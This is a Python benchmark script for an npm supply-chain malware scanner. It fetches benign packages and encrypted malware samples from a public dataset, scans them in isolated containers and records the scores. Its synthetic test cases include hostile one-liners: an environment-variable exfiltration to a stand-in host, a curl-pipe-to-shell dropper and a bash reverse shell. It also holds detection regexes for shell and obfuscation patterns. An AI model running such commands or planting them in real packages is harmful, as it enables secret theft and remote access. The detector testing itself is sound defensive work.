"""Run ONLY inside the isolated benchmark containers; never execute sample code.

Fetch phase stores encrypted samples in container storage. Analysis phase runs
from a committed image with no network, no mounts and read-only root. Only
bounded result metadata (no payloads/snippets) leaves the analysis container.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import random
import re
import time
import zipfile
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timezone
from pathlib import Path, PurePosixPath

from supply_chain_sentinel.adapters.npm import NpmAdapter, request_bytes
from supply_chain_sentinel.archive import artifact_from_files, inspect_archive
from supply_chain_sentinel.config import Config
from supply_chain_sentinel.models import RULESET_VERSION, ScanError, classify
from supply_chain_sentinel.rules import analyze

ROOT = Path("/corpus")
REPO = "DataDog/malicious-software-packages-dataset"


def get(url: str, limit: int = 30 * 1024 * 1024) -> bytes:
    from urllib.parse import urlsplit

    host = urlsplit(url).hostname
    if host not in {"api.github.com", "raw.githubusercontent.com"}:
        raise ValueError("Unapproved dataset host")
    return request_bytes(url, host=host, limit=limit, timeout=45)


def fetch(malicious_count: int, frozen: bool = False) -> None:
    config = Config(cache_dir=ROOT / "cache", timeout=30)
    specs = [
        s
        for s in Path("/opt/benchmarks/benign.txt").read_text().splitlines()
        if s and not s.startswith("#")
    ]

    def benign(spec: str) -> dict[str, object]:
        start = time.perf_counter()
        try:
            artifact = NpmAdapter(config).acquire(spec)
            return {
                "cohort": "benign",
                "spec": spec,
                "sha256": artifact.sha256,
                "acquire_ms": round((time.perf_counter() - start) * 1000, 3),
            }
        except Exception as exc:
            return {"cohort": "benign", "spec": spec, "error": str(exc)}

    with ThreadPoolExecutor(max_workers=6) as pool:
        records = list(pool.map(benign, specs))
    for record in records:
        print(json.dumps(record), flush=True)
    if frozen:
        pinned = json.loads(Path("/opt/benchmarks/corpus.json").read_text())
        expected_benign = {
            item["spec"]: item.get("sha256", "")
            for item in pinned["records"]
            if item["cohort"] == "benign"
        }
        for record in records:
            expected = expected_benign.get(record["spec"], "")
            if expected and record.get("sha256") != expected:
                record["error"] = "Pinned benign archive hash mismatch or acquisition failure"
        (ROOT / "samples").mkdir(exist_ok=True)
        malware = []
        for entry in pinned["records"]:
            if entry["cohort"] != "malicious":
                continue
            try:
                if not entry["url"].startswith(f"https://raw.githubusercontent.com/{REPO}/"):
                    raise ValueError("Unexpected pinned dataset URL")
                data = get(entry["url"], 25 * 1024 * 1024)
                if hashlib.sha256(data).hexdigest() != entry["zip_sha256"]:
                    raise ValueError("Pinned encrypted ZIP hash mismatch")
                (ROOT / "samples" / entry["file"]).write_bytes(data)
                malware.append(entry)
            except Exception as exc:
                malware.append({**entry, "error": str(exc)})
        manifest = {
            "created_at": datetime.now(timezone.utc).isoformat(),
            "dataset_commit": pinned["dataset_commit"],
            "selection_note": pinned["selection_note"],
            "records": records + malware,
        }
        (ROOT / "manifest.json").write_text(json.dumps(manifest))
        return
    commit = json.loads(get(f"https://api.github.com/repos/{REPO}/commits/main"))["sha"]
    tree = json.loads(get(f"https://api.github.com/repos/{REPO}/git/trees/{commit}"))
    for component in ("samples", "npm"):
        sha = next(item["sha"] for item in tree["tree"] if item["path"] == component)
        tree = json.loads(get(f"https://api.github.com/repos/{REPO}/git/trees/{sha}"))
    # Sample package subtrees instead of accepting a truncated recursive global tree.
    rng = random.Random(20261116)
    selected = []
    candidate_packages = 0
    for category in sorted(tree["tree"], key=lambda item: item["path"]):
        if category["type"] != "tree":
            continue
        category_name = category["path"]
        group = json.loads(get(f"https://api.github.com/repos/{REPO}/git/trees/{category['sha']}"))
        packages = sorted(
            (item for item in group["tree"] if item["type"] == "tree"),
            key=lambda item: item["path"],
        )
        candidate_packages += len(packages)
        rng.shuffle(packages)
        count = (
            malicious_count // 3
            if category_name.startswith("compromised")
            else malicious_count - len(selected)
        )
        for package in packages[:count]:
            subtree = json.loads(
                get(f"https://api.github.com/repos/{REPO}/git/trees/{package['sha']}?recursive=1")
            )
            if subtree.get("truncated"):
                raise RuntimeError("Selected package subtree truncated")
            candidates = sorted(
                item["path"]
                for item in subtree["tree"]
                if item["path"].endswith(".zip") and item.get("size", 0) <= 25 * 1024 * 1024
            )
            if candidates:
                path = rng.choice(candidates)
                selected.append(f"{category_name}/{package['path']}/{path}")
    (ROOT / "samples").mkdir(exist_ok=True)

    def malicious(path: str) -> dict[str, object]:
        url = f"https://raw.githubusercontent.com/{REPO}/{commit}/samples/npm/{path}"
        name = hashlib.sha256(path.encode()).hexdigest() + ".zip"
        try:
            data = get(url, 25 * 1024 * 1024)
            (ROOT / "samples" / name).write_bytes(data)
            return {
                "cohort": "malicious",
                "path": path,
                "file": name,
                "url": url,
                "dataset_commit": commit,
                "zip_sha256": hashlib.sha256(data).hexdigest(),
            }
        except Exception as exc:
            return {"cohort": "malicious", "path": path, "error": str(exc)}

    with ThreadPoolExecutor(max_workers=4) as pool:
        malware = list(pool.map(malicious, selected))
    for record in malware:
        print(json.dumps(record), flush=True)
    manifest = {
        "created_at": datetime.now(timezone.utc).isoformat(),
        "dataset_commit": commit,
        "selection_seed": 20261116,
        "npm_candidate_packages": candidate_packages,
        "records": records + malware,
    }
    (ROOT / "manifest.json").write_text(json.dumps(manifest))


def read_sample(path: Path, config: Config):
    with zipfile.ZipFile(path) as bundle:
        infos = bundle.infolist()
        if (
            len(infos) > config.max_files
            or sum(i.file_size for i in infos) > config.max_unpacked_bytes
        ):
            raise ScanError("ZIP resource limit")
        files = {}
        for info in infos:
            member = PurePosixPath(info.filename)
            if member.is_absolute() or ".." in member.parts or "\\" in info.filename:
                raise ScanError("Unsafe ZIP member")
            if info.is_dir():
                continue
            if info.file_size > config.max_archive_bytes:
                raise ScanError("Oversized ZIP member")
            data = bundle.read(info, pwd=b"infected")
            if info.filename.endswith((".tgz", ".tar.gz")):
                return inspect_archive(data, config, "Datadog encrypted ZIP tarball")
            files[str(member)] = data
        manifests = sorted(
            (name for name in files if name.endswith("package.json")),
            key=lambda name: (len(PurePosixPath(name).parts), name),
        )
        if not manifests:
            raise ScanError("No package.json or tarball in dataset ZIP")
        prefix = manifests[0][: -len("package.json")]
        normalized = {
            name[len(prefix) :]: data for name, data in files.items() if name.startswith(prefix)
        }
        digest = hashlib.sha256(path.read_bytes()).hexdigest()
        return artifact_from_files(normalized, digest, "Datadog encrypted ZIP source tree")


def evaluate() -> None:
    config = Config(cache_dir=ROOT / "cache")
    manifest = json.loads((ROOT / "manifest.json").read_text())
    results = []
    for record in manifest["records"]:
        if record.get("error"):
            results.append({**record, "status": "acquisition-error"})
            continue
        started = time.perf_counter()
        try:
            artifact = (
                NpmAdapter(config).acquire(record["spec"], offline=True)
                if record["cohort"] == "benign"
                else read_sample(ROOT / "samples" / record["file"], config)
            )
            findings = analyze(artifact, config)
            score, verdict = classify(findings)
            scan_ms = round((time.perf_counter() - started) * 1000, 3)
            text = "\n".join(
                data.decode("utf-8", errors="replace") for data in artifact.files.values()
            )
            diagnostic_patterns = {
                "environment": r"process.{0,3}env",
                "network": r"https?|fetch|axios",
                "shell": r"child_process|execSync|powershell|spawn",
                "encoding": r"base64|atob|fromCharCode|_0x[0-9a-f]",
                "crypto": r"createDecipher|AES|decrypt",
                "bun": r"setup_bun|bun_environment",
            }
            features = {
                key: len(re.findall(pattern, text)) for key, pattern in diagnostic_patterns.items()
            }
            results.append(
                {
                    **record,
                    "package": artifact.name,
                    "version": artifact.version,
                    "sha256": artifact.sha256,
                    "status": "complete",
                    "score": score,
                    "verdict": verdict,
                    "scan_ms": scan_ms,
                    "diagnostic_features": features,
                    "rules": sorted({f.rule_id for f in findings}),
                    "locations": sorted({f.file for f in findings if f.severity == "high"})[:10],
                }
            )
        except Exception as exc:
            results.append(
                {
                    **record,
                    "status": "scan-error",
                    "error": str(exc),
                    "scan_ms": round((time.perf_counter() - started) * 1000, 3),
                }
            )
    synthetics = {
        "postinstall-env-exfil": "fetch('https://collector.invalid',{body:JSON.stringify(process.env)})",
        "base64-eval": "eval(Buffer.from('Y29uc29sZS5sb2coMSk=','base64').toString())",
        "dropper": "require('child_process').exec('curl https://x.invalid/a | sh')",
        "reverse-shell": "require('child_process').exec('bash -i >& /dev/tcp/127.0.0.1/4444 0>&1')",
        "typosquat-only": "module.exports={}",
        "private-name": "module.exports={}",
        "indirect-env-exfil-miss": "const e=process['env']; const f=globalThis['fetch']; f('https://x.invalid',{body:JSON.stringify(e)})",
    }
    for label, source in synthetics.items():
        name = (
            "lodahs"
            if label == "typosquat-only"
            else "@corp/internal"
            if label == "private-name"
            else label
        )
        config.private_names = ["@corp/internal"]
        artifact = artifact_from_files(
            {
                "package.json": json.dumps(
                    {"name": name, "version": "1.0.0", "scripts": {"postinstall": "node index.js"}}
                ).encode(),
                "index.js": source.encode(),
            },
            "",
            "synthetic",
        )
        start = time.perf_counter()
        findings = analyze(artifact, config)
        score, verdict = classify(findings)
        results.append(
            {
                "cohort": "synthetic",
                "package": label,
                "status": "complete",
                "score": score,
                "verdict": verdict,
                "scan_ms": round((time.perf_counter() - start) * 1000, 3),
                "rules": sorted({f.rule_id for f in findings}),
            }
        )
    output = {
        "manifest": {k: v for k, v in manifest.items() if k != "records"},
        "evaluated_at": datetime.now(timezone.utc).isoformat(),
        "ruleset": RULESET_VERSION,
        "results": results,
    }
    print(json.dumps(output, indent=2))


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("command", choices=("fetch", "evaluate"))
    parser.add_argument("--malicious-count", type=int, default=36)
    parser.add_argument(
        "--frozen", action="store_true", help="Reproduce committed exact corpus manifest"
    )
    args = parser.parse_args()
    if args.command == "fetch":
        fetch(args.malicious_count, args.frozen)
    else:
        evaluate()
